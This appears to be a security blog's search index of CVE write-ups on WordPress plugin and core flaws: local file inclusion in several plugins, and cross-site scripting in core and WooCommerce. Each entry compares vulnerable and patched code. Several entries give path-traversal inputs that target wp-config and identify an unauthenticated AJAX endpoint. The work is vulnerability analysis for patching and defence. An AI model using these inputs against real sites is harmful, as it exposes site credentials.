severity: Low (7.5) Required Privilege: Contributor Product: WordPress Subscribe to Download Lite Plugin Requirements Local WordPress \u0026 Debugging: Local WordPress and Debugging. Plugin versions - Subscribe to Download Lite: 1.2.9 (vulnerable) and 1.3.0 (patched). Diff tool - Meld or any diff tool to inspect and compare differences between the two versions. Analysis Patch diff Vulnerable version: \u003cdiv class=\"stdl-form-wrap stdl-\u003c?php echo esc_attr($form_template); ?\u003e stdl-alias\u003e\"\u003e \u003cform method=\"post\" action=\"\" class=\"stdl-subscription-form\" data-form-alias=\"stdl\"\u003e \u003c?php do_action('stdl_before_form', $form_details); if (file_exists(STDL_PATH . 'inc/views/frontend/form-templates/' . $form_template . '.php')) { include(STDL_PATH . 'inc/views/frontend/form-templates/' . $form_template . '.php'); } do_action('stdl_after_form', $form_details); ?\u003e \u003c/form\u003e \u003c/div\u003e In the vulnerable version, $form_template is concatenated into the path and included without validating the input =\u003e LFI risk, for example: $form_template = '../../../../../../../wp-config' Patched version: \u003cdiv class=\"stdl-form-wrap stdl-\u003c?php echo esc_attr($form_template); ?\u003e stdl-alias\u003e\"\u003e \u003cform method=\"post\" action=\"\" class=\"stdl-subscription-form\" data-form-alias=\"stdl\"\u003e \u003c?php do_action('stdl_before_form', $form_details); $base_dir = realpath(STDL_PATH . 'inc/views/frontend/form-templates') . DIRECTORY_SEPARATOR; $sanitized_template = basename($form_template) . '.php'; $file_path = realpath($base_dir . $sanitized_template); if ($file_path \u0026\u0026 strpos($file_path, $base_dir) === 0 \u0026\u0026 file_exists($file_path)) { include($file_path); } do_action('stdl_after_form', $form_details); ?\u003e \u003c/form\u003e \u003c/div\u003e The patch uses basename() to extract the file name portion of $form_template, removing traversal sequences ../, for example: ../../../../../../payload.pdf -\u003e payload.pdf Then it concatenates into $base_dir and resolves the absolute path with realpath before include() =\u003e effectively eliminates the LFI possibility. Vulnerable Code The vulnerable form-template.php shown above is invoked from stdl-shortcode.php \u003c?php $form_template = (!empty($atts['template'])) ? $atts['template'] : $form_details['layout']['template']; if (isset($_COOKIE['stdl_encryption_key']) \u0026\u0026 $this-\u003echeck_if_already_subscribed($_COOKIE['stdl_encryption_key']) \u0026\u0026 empty($form_details['general']['always_show'])) { // other logic } else { // other logic if ($display_type == 'direct') { include(STDL_PATH . 'inc/views/frontend/form-template.php'); } else { ?\u003e \u003cdiv class=\"stdl-popup-outerwrap \u003c?php echo esc_attr($popup_alias_class); ?\u003e\"\u003e \u003cinput type=\"button\" class=\"stdl-popup-trigger stdl-popup-\u003c?php echo esc_attr($form_template); ?\u003e\" value=\"\u003c?php echo esc_attr($popup_trigger_text); ?\u003e\"\u003e \u003cdiv class=\"stdl-popup-innerwrap\" style=\"display:none;\"\u003e \u003cdiv class=\"stdl-overlay stdl-popup-wrapper\"\u003e \u003cdiv class=\"stdl-popup-contetn-wrap\"\u003e \u003ca href=\"javascript:void(0)\" class=\"stdl-popup-close\"\u003e\u003ci class=\"fas fa-times\"\u003e\u003c/i\u003e\u003c/a\u003e \u003c?php include(STDL_PATH . 'inc/views/frontend/form-template.php'); ?\u003e \u003c/div\u003e \u003c/div\u003e \u003c/div\u003e \u003c/div\u003e \u003c?php } } $form_template is the value of $atts['template'] From CVE analysis experience on WordPress plugins, $atts is typically the shortcode attributes array, for example: [pornhub id=69] Note that form-template.php is always included within the inner if-else block inside the outer else when the stdl_encryption_key cookie does not exist (i.e., the user has not subscribed or does not ha","date":"2025-10-16","objectID":"/posts/2025-10-16-cve-2025-30782/:0:0","tags":["analyst","plugin","lfi"],"title":"CVE-2025-30782 Analysis \u0026 POC","uri":"/posts/2025-10-16-cve-2025-30782/"},{"categories":["CVE Analyst"],"content":"Security Vulnerability in WordPress Team Manager Plugin.","date":"2025-10-15","objectID":"/posts/2025-10-15-cve-2025-30868/","tags":["analyst","plugin","lfi"],"title":"CVE-2025-30868 Analysis \u0026 POC","uri":"/posts/2025-10-15-cve-2025-30868/"},{"categories":["CVE Analyst"],"content":"CVE \u0026 Basic Info The Team Manager plugin version ‚â§ 2.1.23 contains a Local File Inclusion vulnerability that allows an unauthenticated attacker to control the file parameter used in include/require, enabling inclusion or reading of local files on the server (e.g., configuration files containing credentials), leading to leakage of sensitive information and, in some server configurations, possible code execution. CVE ID: CVE-2025-30868 Vulnerability Type: Local File Inclusion Affected Versions: \u003c= 2.1.23 Patched Versions: 2.2.0 CVSS severity: Low (7.5) Required Privilege: Contributor Product: WordPress Team Manager Plugin Requirements Local WordPress \u0026 Debugging: Local WordPress and Debugging. Plugin versions - Team Manager: 2.1.23 (vulnerable) and 2.2.0 (patched). Diff tool - Meld or any diff tool to compare differences between versions. Elementor plugin Analysis Patch diff Vulnerable code: public static function renderElementorLayout(string $layout, array $data, array $settings): void { $styleTypeKey = \"{$layout}_style_type\"; $styleType = stripslashes($settings[$styleTypeKey]); $path = stripslashes(TM_PATH . '/public/templates/elementor/layouts/' . $layout . '/'); $templateName = sanitize_file_name( $styleType . '.php' ); //allowed file type $allowedFileTypes = [ 'php' ]; $ext = pathinfo($path . $templateName, PATHINFO_EXTENSION); if (in_array($ext, $allowedFileTypes)) { if (file_exists($path . $templateName)) { include self::locateTemplate($templateName, '', $path); } } } private static function locateTemplate(string $templateName, string $templatePath = '', string $defaultPath = ''): string { $templatePath = $templatePath ?: 'public/templates'; $defaultPath = $defaultPath ?: TM_PATH . '/public/templates/'; $template = locate_template(trailingslashit($templatePath) . $templateName); return $template ?: \"{$defaultPath}{$templateName}\"; } In the vulnerable version, renderElementorLayout() does not validate input values. An attacker can bypass the logic if they control $layout and $settings, for example: In renderElementorLayout(): $layout = \"../../../../../../..\" $settings['../../../../../../.._style_type'] = \"wp-config\" Then: $styleType = 'wp-config' $path = TM_PATH . '/public/templates/elementor/layouts/../../../../../../../' $templateName = wp-config.php $path . $templateName = TM_PATH . '/public/templates/elementor/layouts/../../../../../../../wp-config.php' Debugger values of variables After passing the if checks, the code includes the return value of locateTemplate(wp-config.php, '', TM_PATH . '/public/templates/elementor/layouts/../../../../../../../'): private static function locateTemplate(string $templateName, string $templatePath = '', string $defaultPath = ''): string { $templatePath = $templatePath ?: 'public/templates'; $defaultPath = $defaultPath ?: TM_PATH . '/public/templates/'; $template = locate_template(trailingslashit($templatePath) . $templateName); return $template ?: \"{$defaultPath}{$templateName}\"; } At this point: $templatePath = public/templates $defaultPath = TM_PATH . '/public/templates/elementor/layouts/../../../../../../../' $locate_template = locate_template('public/templates/wp-config.php') = \"\" ‚Äî locate_template() returns the absolute path if found, otherwise returns an empty string \"\". When $locate_template is empty, it returns TM_PATH . '/public/templates/elementor/layouts/../../../../../../../wp-config.php' to include. Patched code: public static function renderElementorLayout(string $layout, array $data, array $settings): void { $allowedLayouts = ['grid', 'list', 'slider', 'table', 'isotope']; // Allowed layouts if (!in_array($layout, $allowedLayouts, true)) { wp_die(__('Invalid layout.', 'wp-team-manager')); } $styleTypeKey = \"{$layout}_style_type\"; $styleType = $settings[$styleTypeKey] ?? ''; // Ensure only safe characters (alphanumeric + underscores) if (!preg_match('/^[a-zA-Z0-9_-]+$/', $styleType)) { wp_die(__('Invalid style type.', 'wp-team-manager')); } // Ensure constants exist befo","date":"2025-10-15","objectID":"/posts/2025-10-15-cve-2025-30868/:0:0","tags":["analyst","plugin","lfi"],"title":"CVE-2025-30868 Analysis \u0026 POC","uri":"/posts/2025-10-15-cve-2025-30868/"},{"categories":["CVE Analyst"],"content":"Security Vulnerability in WordPress Motors Plugin.","date":"2025-10-14","objectID":"/posts/2025-10-14-cve-2025-32654/","tags":["analyst","plugin","lfi"],"title":"CVE-2025-32654 Analysis \u0026 POC","uri":"/posts/2025-10-14-cve-2025-32654/"},{"categories":["CVE Analyst"],"content":"CVE \u0026 Basic Info The Motors plugin, version ‚â§ 1.4.71, contains a Local File Inclusion (LFI) vulnerability that allows an unauthenticated attacker to control a file parameter in an include/require statement, thereby injecting or reading local files on the server (e.g., configuration files containing credentials). This can lead to sensitive information disclosure, and under certain configurations, remote code execution. CVE ID: CVE-2025-32654 Vulnerability Type: Local File Inclusion Affected Versions: \u003c= 1.4.71 Patched Versions: 1.4.72 CVSS Severity: High (8.1) Required Privilege: Unauthenticated Product: WordPress Motors Plugin Requirements Local WordPress \u0026 Debugging: Local WordPress and Debugging. Plugin versions ‚Äì Motors: 1.4.71 (vulnerable) and 1.4.72 (patched). Diff tool ‚Äì Meld or any other comparison (diff) tool to inspect and compare differences between two versions. Analysis Patch diff Vulnerable version: public static function motors_ew_grid_tabs() { $template = sanitize_text_field( $_POST['template'] ); // other logic } The vulnerable code only sanitizes HTML characters using sanitize_text_field(), without restricting paths ‚Äî thus an attacker can inject ../ or any filename, leading to LFI. Patched version: public static function motors_ew_grid_tabs() { $allowed_templates = array( 'listing-cars/listing-grid-directory-loop-4', 'listing-cars/listing-grid-directory-loop-3', 'listing-cars/listing-grid-directory-loop', ); $template = 'listing-cars/' . ( isset( $_POST['template'] ) ? sanitize_file_name( $_POST['template'] ) : '' ); if ( ! in_array( $template, $allowed_templates, true ) ) { wp_send_json_error( 'Invalid template' ); return; } // other logic } The patch applies sanitize_file_name() along with a whitelist to validate input, effectively neutralizing any possible exploitation through the template parameter. Vulnerable Code The function motors_ew_grid_tabs() is registered as a callback for the action hook \"grid_tabs_widget\" via: add_action( 'wp_ajax_nopriv_grid_tabs_widget', array( self::class, 'motors_ew_grid_tabs' ) ); The prefix wp_ajax_nopriv_ indicates that this action does not require user authentication to trigger the AJAX endpoint. Therefore, the endpoint can be publicly accessed through: /wp-admin/admin-ajax.php?action=grid_tabs_widget When invoked, motors_ew_grid_tabs() is executed: public static function motors_ew_grid_tabs() { check_ajax_referer( 'motors_grid_tabs', 'security' ); $listing_types = apply_filters( 'stm_listings_post_type', 'listings' ); $tab_type = sanitize_text_field( $_POST['tab_type'] ); $per_page = intval( $_POST['per_page'] ); $template = sanitize_text_field( $_POST['template'] ); $img_size = sanitize_text_field( $_POST['img_size'] ); $args = array( 'post_type' =\u003e $listing_types, 'post_status' =\u003e 'publish', 'posts_per_page' =\u003e $per_page, ); if ( 'popular' === $tab_type ) { $args = array_merge( $args, array( 'orderby' =\u003e 'meta_value_num', 'meta_key' =\u003e 'stm_car_views', 'order' =\u003e 'DESC', ) ); } $args['meta_query'][] = array( 'key' =\u003e 'car_mark_as_sold', 'value' =\u003e '', 'compare' =\u003e '=', ); $template_args = array(); if ( ! empty( $img_size ) ) { $template_args = array( 'custom_img_size' =\u003e $img_size, ); } $listings_query = new WP_Query( $args ); if ( $listings_query-\u003ehave_posts() ) { $output = ''; ob_start(); while ( $listings_query-\u003ehave_posts() ) { $listings_query-\u003ethe_post(); do_action( 'stm_listings_load_template', $template, $template_args ); } $output .= ob_get_clean(); } wp_send_json( array( 'html' =\u003e $output, ) ); } At the beginning of motors_ew_grid_tabs(), this line: check_ajax_referer( 'motors_grid_tabs', 'security' ); performs a nonce validation to protect against CSRF (Cross-Site Request Forgery). If the nonce provided by the client is invalid or missing, the function halts further AJAX processing ‚Äî meaning all subsequent logic (handling $template, post query, and HTML rendering) will not execute. public static function motors_create_nonce() { $grid_tabs_widget = wp_create_n","date":"2025-10-14","objectID":"/posts/2025-10-14-cve-2025-32654/:0:0","tags":["analyst","plugin","lfi"],"title":"CVE-2025-32654 Analysis \u0026 POC","uri":"/posts/2025-10-14-cve-2025-32654/"},{"categories":["CVE Analyst"],"content":"Security Vulnerability in WordPress Geo Mashup Plugin.","date":"2025-10-13","objectID":"/posts/2025-10-13-cve-2025-48293/","tags":["analyst","plugin","lfi"],"title":"CVE-2025-48293 Analysis \u0026 POC","uri":"/posts/2025-10-13-cve-2025-48293/"},{"categories":["CVE Analyst"],"content":"CVE \u0026 Basic Info The Geo Mashup plugin version ‚â§ 1.13.16 contains a Local File Inclusion vulnerability that allows an unauthenticated attacker to control the file parameter used in include/require, thereby injecting or reading local files on the server (for example configuration files containing credentials), leading to leakage of sensitive information and, in some configurations, potential code execution. CVE ID: CVE-2025-48293 Vulnerability Type: Local File Inclusion Affected Versions: \u003c= 1.13.16 Patched Versions: 1.13.17 CVSS severity: High (9.8) Required Privilege: Unauthenticated Product: WordPress Geo Mashup Plugin Requirements Local WordPress \u0026 Debugging: Local WordPress and Debugging. Plugin versions - Geo Mashup: 1.13.16 (vulnerable) and 1.13.17 (patched). Diff tool - Meld or any diff/comparison tool to inspect differences between the two versions. Analysis Patch diff Vulnerable code: public static function generate_object_html( ) { $template_base = ( isset( $_GET['template'] ) ) ? $_GET['template'] : ''; // other logc load_template( GeoMashup::locate_template( $template_base ) ); } $template_base is taken directly from $_GET['template'] without any checks/sanitization. The value is passed to GeoMashup::locate_template() and then used with load_template() ‚Äî an attacker can control the file path to be included. Patch: public static function generate_object_html( ) { $template_base = ( isset( $_GET['template'] ) ) ? sanitize_key($_GET['template']) : ''; // other logic load_template( GeoMashup::locate_template( $template_base ) ); } sanitize_key() is applied to template =\u003e removes unsafe characters, prevents ../, \\, and special characters, reducing the risk of path traversal and LFI from the template parameter. Vulnerable Code We analyze the logic in GeoMashup::locate_template() to see how it affects $template_base public static function locate_template( $template_base ) { $template = locate_template( array(\"geo-mashup-$template_base.php\") ); if ( empty( $template ) || !is_readable( $template ) ) { $template = path_join( GEO_MASHUP_DIR_PATH, \"default-templates/$template_base.php\" ); } return $template; } $template is reassigned by calling locate_template() (from template.php) with the argument geo-mashup-$template_base.php function locate_template( $template_names, $load = false, $load_once = true, $args = array() ) { global $wp_stylesheet_path, $wp_template_path; if ( ! isset( $wp_stylesheet_path ) || ! isset( $wp_template_path ) ) { wp_set_template_globals(); } $is_child_theme = is_child_theme(); $located = ''; foreach ( (array) $template_names as $template_name ) { if ( ! $template_name ) { continue; } if ( file_exists( $wp_stylesheet_path . '/' . $template_name ) ) { $located = $wp_stylesheet_path . '/' . $template_name; break; } elseif ( $is_child_theme \u0026\u0026 file_exists( $wp_template_path . '/' . $template_name ) ) { $located = $wp_template_path . '/' . $template_name; break; } elseif ( file_exists( ABSPATH . WPINC . '/theme-compat/' . $template_name ) ) { $located = ABSPATH . WPINC . '/theme-compat/' . $template_name; break; } } if ( $load \u0026\u0026 '' !== $located ) { load_template( $located, $load_once, $args ); } return $located; } The logic checks for the existence of files when concatenated with $template_name; if none exist it returns an empty string ''. File existence related logic When an attacker sends $_GET['template'] containing ../ the file will by default not exist, and locate_template() returns ''. Returning to GeoMashup::locate_template(), when $template is empty and not readable (!is_readable($template)) it is reassigned and returned. const string GEO_MASHUP_DIR_PATH = \"/srv/www/wordpress/wp-content/plugins/geo-mashup\" GEO_MASHUP_DIR_PATH.default-templates/$template_base.php üëâ GeoMashup::locate_template() does not modify $template_base which we control, so we proceed to find a way to trigger this behavior. if ( ( isset( $_GET['output'] ) and 'json' == $_GET['output'] ) or empty( $_GET['object_ids'] ) ) { Geo","date":"2025-10-13","objectID":"/posts/2025-10-13-cve-2025-48293/:0:0","tags":["analyst","plugin","lfi"],"title":"CVE-2025-48293 Analysis \u0026 POC","uri":"/posts/2025-10-13-cve-2025-48293/"},{"categories":["CVE Analyst"],"content":"Security Vulnerability in WordPress Poll, Survey \u0026 Quiz Maker Plugin by Opinion Stage Plugin.","date":"2025-10-12","objectID":"/posts/2025-10-12-cve-2025-53328/","tags":["analyst","plugin","lfi"],"title":"CVE-2025-53328 Analysis \u0026 POC","uri":"/posts/2025-10-12-cve-2025-53328/"},{"categories":["CVE Analyst"],"content":"CVE \u0026 Basic Info The Poll, Survey \u0026 Quiz Maker Plugin by Opinion Stage version ‚â§ 19.11.0 contains a Local File Inclusion (CVE-2025-53328, CVSS 7.5) vulnerability that allows an unauthenticated attacker to control the file parameter in an include/require call, enabling inclusion or reading of local files on the server (e.g., configuration files containing credentials), leading to disclosure of sensitive information and, in some configurations, potential code execution. CVE ID: CVE-2025-53328 Vulnerability Type: Local File Inclusion Affected Versions: \u003c= 19.11.0 Patched Versions: 19.11.1 CVSS severity: High (7.5) Required Privilege: Unauthenticated Product: WordPress Poll, Survey \u0026 Quiz Maker Plugin by Opinion Stage Plugin Important Although the vulnerability is published as Unauthenticated, in many deployments exploitation practically requires minimal internal privileges ‚Äî for example a Contributor account or equivalent in WordPress. Requirements Local WordPress \u0026 Debugging: Local WordPress and Debugging. Plugin versions - Poll, Survey \u0026 Quiz Maker Plugin by Opinion Stage: 19.11.0 (vulnerable) and 19.11.1 (patched). Diff tool - Meld or any diff tool to compare differences between versions. Analysis Patch diff Vulnerable version: private static function prepare_view_file_name_form_current_page() { $view_file_name = ''; if ( !empty( $_REQUEST['page'] ) ) { $qry_str_check_os = sanitize_text_field( $_REQUEST['page'] ); $qry_str_check_os = explode( '-', $qry_str_check_os ); if ( 'opinionstage' === $qry_str_check_os[0] ) { $view_file_name = str_replace( 'opinionstage-', '', sanitize_text_field( $_REQUEST['page'] ) ); $view_file_name = str_replace( '-', '_', $view_file_name ); } } return $view_file_name; } In the vulnerable version, the page parameter is taken from $_REQUEST and controlled by the user but the file name is not properly validated ‚Üí allowing Local File Inclusion. The function only uses sanitize_text_field and checks the opinionstage- prefix, then removes the prefix and replaces - with _, so an attacker can supply: ?page=opinionstage-../../wp-config Patched version: private static function prepare_view_file_name_from_current_page() { if (empty($_REQUEST['page']) || !is_string($_REQUEST['page'])) { return ''; } $page = sanitize_text_field($_REQUEST['page']); if (substr($page, 0, strlen('opinionstage-')) !== 'opinionstage-') { return ''; } $template_name = substr($page, strlen('opinionstage-')); $template_name = str_replace('-', '_', $template_name); if (!in_array($template_name, self::$allowed_templates, true)) { return ''; } if (strpos($template_name, '..') !== false || strpos($template_name, '/') !== false || strpos($template_name, '\\\\') !== false) { return ''; } return $template_name; } The patch adds multiple protections: type checking, prefix verification (\"opinionstage-\"), a whitelist (self::$allowed_templates), and blocking traversal characters. Vulnerable Code The function prepare_view_file_name_form_current_page() is called from load_template(): public static function load_template() { $view_file_name = self::prepare_view_file_name_form_current_page(); if ( !$view_file_name ) { return; } $os_client_logged_in = Helper::is_user_logged_in(); $os_options = Helper::get_opinionstage_option(); TemplatesViewer::require_template( 'admin/views/' . $view_file_name, compact( 'os_client_logged_in', 'os_options' ) ); } require_template() is invoked with 'admin/views/'.$view_file_name: public static function require_template($template_name, $args = []) { $path = Opinionstage::get_instance()-\u003eplugin_path . $template_name . '.php'; if( ! file_exists( $path ) ) { return; } extract($args); require( $path ); } The require() call that causes LFI uses $path concatenated from the plugin path (plugin_path), $template_name, and .php: public function register_menu_page() { if ( function_exists( 'add_menu_page' ) ) { $os_client_logged_in = Helper::is_user_logged_in(); if ( $os_client_logged_in ) { add_menu_page( __( 'Opinion Stage', 'social","date":"2025-10-12","objectID":"/posts/2025-10-12-cve-2025-53328/:0:0","tags":["analyst","plugin","lfi"],"title":"CVE-2025-53328 Analysis \u0026 POC","uri":"/posts/2025-10-12-cve-2025-53328/"},{"categories":["CVE Analyst"],"content":"Security Vulnerability in WordPress Core.","date":"2025-10-11","objectID":"/posts/2025-10-11-cve-2025-58674/","tags":["analyst","core","xss"],"title":"CVE-2025-58674 Analysis \u0026 POC","uri":"/posts/2025-10-11-cve-2025-58674/"},{"categories":["CVE Analyst"],"content":"A Stored Cross Site Scripting (XSS) vulnerability occurs in WordPress Core prior to version 6.8.3. The root cause is improper input handling when generating dynamic pages, affecting the menu creation feature (nav menus). CVE ID: CVE-2025-58674 Vulnerability Type: Cross Site Scripting (XSS) Affected Versions: \u003c= 6.8.2 Patched Versions: 6.8.3 CVSS severity: Low (5.9) Required Privilege: Author Product: WordPressCore Requirements Local WordPress \u0026 Debugging: Local WordPress and Debugging. WordPress Core Versions: v6.8.2 (vulnerable) and v6.8.3 (patched). Diff Tool - Meld or any diff/comparison tool to inspect and compare differences between the two versions. Theme - Astra: A very popular theme among WordPress users, which supports quick creation of nav menu items. Analysis WordPress is open source and its repository is on GitHub, so we can look at the commit related to the XSS fix to observe the changes and understand where the vulnerability occurs. Patch diff Vulnerable version: updateParentDropdown : function() { return this.each(function(){ var menuItems = $( '#menu-to-edit li' ), parentDropdowns = $( '.edit-menu-item-parent' ); $.each( parentDropdowns, function() { var parentDropdown = $( this ), $html = '', $selected = '', currentItemID = parentDropdown.closest( 'li.menu-item' ).find( '.menu-item-data-db-id' ).val(), currentparentID = parentDropdown.closest( 'li.menu-item' ).find( '.menu-item-data-parent-id' ).val(), currentItem = parentDropdown.closest( 'li.menu-item' ), currentMenuItemChild = currentItem.childMenuItems(), excludeMenuItem = [ currentItemID ]; if ( currentMenuItemChild.length \u003e 0 ) { $.each( currentMenuItemChild, function(){ var childItem = $(this), childID = childItem.find( '.menu-item-data-db-id' ).val(); excludeMenuItem.push( childID ); }); } if ( currentparentID == 0 ) { $selected = 'selected'; } $html += '\u003coption ' + $selected + ' value=\"0\"\u003e' + wp.i18n._x( 'No Parent', 'menu item without a parent in navigation menu' ) + '\u003c/option\u003e'; $.each( menuItems, function() { var menuItem = $(this), $selected = '', menuID = menuItem.find( '.menu-item-data-db-id' ).val(), menuTitle = menuItem.find( '.edit-menu-item-title' ).val(); if ( ! excludeMenuItem.includes( menuID ) ) { if ( currentparentID == menuID ) { $selected = 'selected'; } $html += '\u003coption ' + $selected + ' value=\"' + menuID + '\"\u003e' + menuTitle + '\u003c/option\u003e'; } }); parentDropdown.html( $html ); }); }); }, In the vulnerable version, the value menuTitle is inserted into the \u003coption\u003e tag and rendered into HTML using jQuery‚Äôs html() method without any XSS prevention. The html() function replaces the HTML content inside the element, so if menuTitle contains malicious code it will be executed in the browser. Patched version: updateParentDropdown : function() { return this.each(function(){ var menuItems = $( '#menu-to-edit li' ), parentDropdowns = $( '.edit-menu-item-parent' ); $.each( parentDropdowns, function() { var parentDropdown = $( this ), currentItemID = parseInt( parentDropdown.closest( 'li.menu-item' ).find( '.menu-item-data-db-id' ).val() ), currentParentID = parseInt( parentDropdown.closest( 'li.menu-item' ).find( '.menu-item-data-parent-id' ).val() ), currentItem = parentDropdown.closest( 'li.menu-item' ), currentMenuItemChild = currentItem.childMenuItems(), excludeMenuItem = /** @type {number[]} */ [ currentItemID ]; parentDropdown.empty(); if ( currentMenuItemChild.length \u003e 0 ) { $.each( currentMenuItemChild, function(){ var childItem = $(this), childID = parseInt( childItem.find( '.menu-item-data-db-id' ).val() ); excludeMenuItem.push( childID ); }); } parentDropdown.append( $( '\u003coption\u003e', { value: '0', selected: currentParentID === 0, text: wp.i18n._x( 'No Parent', 'menu item without a parent in navigation menu' ), } ) ); $.each( menuItems, function() { var menuItem = $(this), menuID = parseInt( menuItem.find( '.menu-item-data-db-id' ).val() ), menuTitle = menuItem.find( '.edit-menu-item-title' ).val(); if ( ! excludeMenuItem.includes( menuID ","date":"2025-10-11","objectID":"/posts/2025-10-11-cve-2025-58674/:0:0","tags":["analyst","core","xss"],"title":"CVE-2025-58674 Analysis \u0026 POC","uri":"/posts/2025-10-11-cve-2025-58674/"},{"categories":["CVE Analyst"],"content":"Security Vulnerability in WordPress WooCommerce Plugin.","date":"2025-10-10","objectID":"/posts/2025-10-10-cve-2025-5062/","tags":["analyst","plugin","xss"],"title":"CVE-2025-5062 Analysis \u0026 POC","uri":"/posts/2025-10-10-cve-2025-5062/"},{"categories":["CVE Analyst"],"content":"CVE \u0026 Basic Info The WooCommerce plugin for WordPress has a PostMessage-based Cross-Site Scripting (XSS) vulnerability via the ‚Äòcustomize-store‚Äô page in all versions up to and including 9.4.2, due to insufficiently safe handling of PostMessage data (no input sanitization and no escaping when output). This allows an unauthenticated attacker to inject arbitrary script into the site that will execute if they can trick a user into performing an action, for example clicking a link. CVE ID: CVE-2025-5062 Vulnerability Type: Cross Site Scripting (XSS) Affected Versions: \u003c= 9.3.2 and from 9.4 through 9.4.2 Patched Versions: 9.3.4 and 9.4.3 CVSS severity: Low (6.1) Required Privilege: Unauthenticated Product: WordPress WooCommerce Plugin Requirements Local WordPress \u0026 Debugging: Local WordPress and Debugging. Plugin versions - WooCommerce: 9.4.2 (vulnerable) and 9.4.3 (patched). Diff tool - Meld or any diff/comparison tool to inspect differences between the two versions. Analysis Patch diff In the vulnerable version, attachParentListeners() listens to all messages from any origin without checking the origin; data from the message is assigned directly into the DOM which leads to PostMessage-Based XSS (a subtype of DOM‚Äëbased XSS). export function attachParentListeners() { const listener = ( event ) =\u003e { if ( event.data.type === 'navigate' ) { window.location.href = event.data.url; } }; window.addEventListener( 'message', listener, false ); return () =\u003e { window.removeEventListener( 'message', listener, false ); }; } {: file=‚Äúclient/admin/client/customize-store/utils.js v9.4.2‚Äù} In the patched version, more checks and restrictions were added compared to the vulnerable version, moving from \"accept every message and redirect straight away\" to \"only accept trusted messages, validate structure and check the URL before navigation\". export function attachParentListeners() { const allowedOrigins = [ getAdminSetting( 'homeUrl' ) ]; function handleMessage( event ) { // Validate the origin. if ( ! allowedOrigins.includes( event.origin ) ) { // Blocked message from untrusted origin: event.origin. return; } // Validate the structure of event.data. if ( ! event.data || typeof event.data.type !== 'string' || typeof event.data.url !== 'string' ) { // Invalid message structure: event.data. return; } // Only allow the 'navigate' type. if ( event.data.type === 'navigate' ) { // Validate the URL format. try { const url = parseAdminUrl( event.data.url ); // Further restrict navigation to trusted domains. if ( ! allowedOrigins.some( ( origin ) =\u003e url.origin === origin ) ) { throw new Error( `Blocked navigation to untrusted URL: ${ url.href }` ); } window.location.href = url.href; } catch ( error ) { // Invalid URL: event.data.url. captureException( error ); } } } window.addEventListener( 'message', handleMessage, false ); return function removeListener() { window.removeEventListener( 'message', handleMessage, false ); }; } {: file=‚Äúclient/admin/client/customize-store/utils.js v9.4.3‚Äù} Diff ‚Äî Comparison of source changes between the vulnerable and patched versions Vulnerable code Although I found the source and sink, when analyzing the plugin source after download I initially could not find the function attachParentListeners(). Search results for attachParentListeners() I thought my setup had failed and the code hadn‚Äôt been fully downloaded. But no ‚Äî when searching for the keyword \"navigate\" I found a function with a different name but the same functionality as attachParentListeners(). Search results for ‚Äúnavigate‚Äù üëâ In the product build, to optimize browser load time the plugin used minification which removes whitespace, renames functions/variables to short names, and partially obfuscates the code making it harder to read. The downloaded file was named 5292.js instead of utils.js. After beautifying the code, I found 5292.js contains the utils.js code and many other files‚Äô code. Visiting the customize-store page and sending a postMessage through the browser co","date":"2025-10-10","objectID":"/posts/2025-10-10-cve-2025-5062/:0:0","tags":["analyst","plugin","xss"],"title":"CVE-2025-5062 Analysis \u0026 POC","uri":"/posts/2025-10-10-cve-2025-5062/"},{"categories":["CVE Analyst"],"content":"Security Vulnerability in WordPress Core.","date":"2025-10-09","objectID":"/posts/2025-10-09-cve-2024-4439/","tags":["analyst","core","xss"],"title":"CVE-2024-4439 Analysis \u0026 POC","uri":"/posts/2025-10-09-cve-2024-4439/"},{"categories":["CVE Analyst"],"content":"CVE \u0026 Basic Info WordPress Core is vulnerable to Stored Cross-Site Scripting via the user‚Äôs display name in the Avatar block in multiple versions up to 6.5.2 due to insufficient output escaping of the display name. This allows authenticated attackers with contributor-level access or higher to inject arbitrary web scripts into pages ‚Äî those scripts will execute whenever a user visits the page containing the injection. Additionally, it allows unauthenticated attackers to inject arbitrary web scripts into pages that contain a comment block showing the comment author‚Äôs avatar. CVE ID: CVE-2024-4439 Vulnerability Type: Cross Site Scripting (XSS) Affected Versions: 6.0 - 6.0.7 6.1 - 6.1.5 6.2 - 6.2.4 6.3 - 6.3.3 6.4 - 6.4.3 6.5 - 6.5.1 Patched Versions: 6.0.8 6.1.6 6.2.5 6.3.4 6.4.4 6.5.2 CVSS severity: 7.2 (High) Required Privilege: Contributor+ Product: WordPress Requirements Local WordPress \u0026 Debugging: Local WordPress and Debugging. Core versions: 6.4.3 (vulnerable) and 6.4.4 (patched). Diff tool - Meld or any diff/comparison tool to inspect and compare differences between the two versions. Analysis Patch diff In the vulnerable version, WP Core used esc_attr__() to translate the string and escape an HTML attribute before outputting to the browser, but it was implemented incorrectly. $label = 'aria-label=\"' . sprintf( esc_attr__( '(%s author archive, opens in a new tab)' ), $author_name ) . '\"'; Here esc_attr__() translates and escapes the HTML before being passed to sprintf() to inject $author_name ‚Äî therefore $author_name is not escaped. In the patched version, $author_name is passed into sprintf() first and then the full string is escaped with esc_attr(), which is safe against XSS. $label = 'aria-label=\"' . esc_attr( sprintf( __( '(%s author archive, opens in a new tab)' ), $author_name ) ) . '\"'; Comparison between the vulnerable and patched versions Vulnerable code function render_block_core_avatar( $attributes, $content, $block ) { // other logic if ( ! isset( $block-\u003econtext['commentId'] ) ) { $author_id = isset( $attributes['userId'] ) ? $attributes['userId'] : get_post_field( 'post_author', $block-\u003econtext['postId'] ); $author_name = get_the_author_meta( 'display_name', $author_id ); // other logic if ( isset( $attributes['isLink'] ) \u0026\u0026 $attributes['isLink'] ) { $label = ''; if ( '_blank' === $attributes['linkTarget'] ) { // translators: %s is the Author name. $label = 'aria-label=\"' . sprintf( esc_attr__( '(%s author archive, opens in a new tab)' ), $author_name ) . '\"'; } } } // other logic } The Avatar block is a Block Editor block used to render post or comment content in WordPress. $author_name is the display_name of the author with $author_id belonging to the current post. If this is a post and the link option is enabled, the $author_name containing a payload will be added to the aria-label attribute and output to the browser. When visiting any post, wp() is called to load that post‚Äôs data. function wp( $query_vars = '' ) { global $wp, $wp_query, $wp_the_query; $wp-\u003emain( $query_vars ); if ( ! isset( $wp_the_query ) ) { $wp_the_query = $wp_query; } } Here $wp_query is created and will contain the wp_post values after the query. public function main( $query_args = '' ) { $this-\u003einit(); $parsed = $this-\u003eparse_request( $query_args ); if ( $parsed ) { $this-\u003equery_posts(); $this-\u003ehandle_404(); $this-\u003eregister_globals(); } $this-\u003esend_headers(); do_action_ref_array( 'wp', array( \u0026$this ) ); } main() will parse_request and perform the query to fetch the current post information using query_posts(). $wp_the_query is the main WP_Query object in WordPress, 